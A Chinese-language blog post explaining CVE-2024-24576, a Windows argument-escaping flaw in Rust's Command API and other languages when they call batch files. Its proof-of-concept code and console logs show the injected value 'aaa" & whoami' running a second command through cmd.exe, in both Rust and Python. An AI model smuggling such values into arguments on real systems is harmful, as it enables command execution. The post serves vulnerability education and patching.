---
title: "Rust\Python等编程语言对Win下CMD进行越权"
pubDatetime: 2024-05-07T00:00:00Z
description: "此处有崇山峻岭，茂林修竹"
tags: []
---

# CVE-2024-24576 Windows Rust

> The Rust Security Response WG was notified that the Rust standard library did not properly escape arguments when invoking batch files (with the `bat` and `cmd` extensions) on Windows using the [`Command`](https://doc.rust-lang.org/std/process/struct.Command.html) API. An attacker able to control the arguments passed to the spawned process could execute arbitrary shell commands by bypassing the escaping.

Rust 编程语言背后的项目声称，对特定 API 的任何调用都是安全的，即使输入的是不安全的内容，但研究人员找到了绕过保护的方法。利用该漏洞可以在windows cmd中注入恶意代码。

**受影响的 Rust 版本：**Rust for Windows < 1.77.2

**CVSS等级：**10.0

**漏洞影响面：**

这个漏洞只存在于 Windows 系统，但不仅仅影响 Rust 语言，像 PHP、Python、Node.js 等均受影响，具体可以参考如下页面：

1. CERT/CC: [Multiple programming languages fail to escape arguments properly in Microsoft Windows](https://www.kb.cert.org/vuls/id/123335)
2. Flatt Security Inc./RyotaK: [BatBadBut: You can’t securely execute commands on Windows](https://flatt.tech/research/posts/batbadbut-you-cant-securely-execute-commands-on-windows/)

#### PoC

###### test.bat

```
@echo off
echo Argument received: %1
```

###### test.rs

```
use std::io::{self, Write};
use std::process::Command;

fn main() {
    println!("enter payload here");
    let mut input = String::new();
    io::stdout().flush().expect("Failed to flush stdout");
    io::stdin().read_line(&mut input).expect("Failed to read from stdin");
    let output = Command::new("./test.bat")
                    .arg(input.trim())
                    .output()
                    .expect("Failed to execute command");
    println!("Output:\n{}", String::from_utf8_lossy(&output.stdout));
}
```

###### 测试

```
D:\>rustc test.rs

D:\>test.exe
enter payload here
aaa
Output:
Argument received: aaa

D:\>test.exe
enter payload here
aaa & whoami
Output:
Argument received: "aaa & whoami"

D:\>test.exe
enter payload here
aaa" & whoami
Output:
Argument received: "aaa\"
desktop-618ia48\ddw
```

###### 错误逻辑与修复

漏洞版本会把样例包装成`cmd.exe /d /c ""D:\test.bat" "aaa\" & whoami""`

修复版本会把样例包装成`cmd.exe /e:ON /v:OFF /d /c ""D:\test.bat" "aaa"" & whoami""`

###### Python样例

```
D:\>python3
Python 3.11.6 (tags/v3.11.6:8b6ee5b, Oct  2 2023, 14:57:12) [MSC v.1935 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> import subprocess
>>> subprocess.Popen(['test.bat', 'aaa" & whoami'])
<Popen: returncode: None args: ['test.bat', 'aaa" & whoami']>
>>> Argument received: "aaa\"
desktop-618ia48\ddw
```

##### 总结

在Windows下以Rust、Python及一些语言调用cmd时，运行.bat, .cmd等都会因为转义逻辑出错而产生预料外行为。该漏洞跟内存安全没有关系，是 Windows 下 `cmd.exe` 对命令行参数的特殊解析逻辑所导致的逻辑漏洞。

##### 参考文档

1. https://flatt.tech/research/posts/batbadbut-you-cant-securely-execute-commands-on-windows/
2. https://blog.rust-lang.org/2024/04/09/cve-2024-24576.html
3. https://www.kb.cert.org/vuls/id/123335
4. https://github.com/frostb1ten/CVE-2024-24576-PoC/tree/main
5. https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw
6. https://learn.microsoft.com/en-us/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way
7. https://persistence-info.github.io/Data/cmdautorun.html
8. https://programlife.net/2024/04/14/cve-2024-24576-rust-command-injection-vulnerability/

赞赏